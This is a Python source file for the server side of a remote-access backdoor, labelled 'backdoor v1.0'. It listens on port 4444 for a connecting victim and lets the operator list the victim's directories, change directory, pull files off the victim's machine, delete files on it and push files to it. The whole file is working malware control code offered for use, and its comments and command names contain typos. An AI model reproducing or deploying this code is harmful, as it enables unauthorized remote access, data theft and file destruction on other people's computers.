#backdoor v1.0 --server--
#command list:
#view_cwd : will show all files in the directory where file is running
#costum_dir : will move you to whatever directory you want
#download_file : will download the files from directory
#remove_file : will remove the selected file
import os
import socket
s=socket.socket()
host="192.168.100.93"
port=4444
s.bind((host,port))
print("\nserver is currently running @"+host)
print("waiting for any incoming connections ...") 
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, "has connected to the server successfully")
while 1:
    print("")
    command=input(str("command >>"))
    if command == "view_cwd":
        conn.send(command.encode())
        print("command sent, waiting for the exectution ...")
        print("")
        files=conn.recv(5000)
        files=files.decode()
        print("command output: ",files)
    elif command == "custom_dir" :
        conn.send(command.encode())
        print("")
        user_input=input(str("custom directory: "))
        conn.send(user_input.encode())
        print("\ncommand has been sent\n")
        files=conn.recv(5000)
        files=files.decode()
        print("coustum dir result", files)
    elif command == "download_file" :
        # Download a file 
        conn.send(command.encode())
        print("")
        file_path = input(str(" please enter the files path: "))
        conn.send(file_path.encode())
        file = conn.recv(100000)
        filename = input(str("please enter name of file with extension: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("Downloaded and saved")
        print("")
    elif command == "remove_file" :
        conn.send(command.encode())
        print("")
        fileanddir=input(str("please enter the file name and the directory :"))
        conn.send(fileanddir.encode())
        print("command has been exectuted successfully")
        print("")
    elif command == "send_file" :
        conn.send(command.encode())
        file=input(str("please the enter the file name and directory :"))
        filename=input(str("please enter the file name and extenion :"))
        data=open(file, "rb")
        file_data=data.read(7000) #change when the file is big
        conn.send(filename.encode())
        print(file, " has been sent successfully")
        conn.send(file_data)
    else:
        print("\ncommand not recognized")
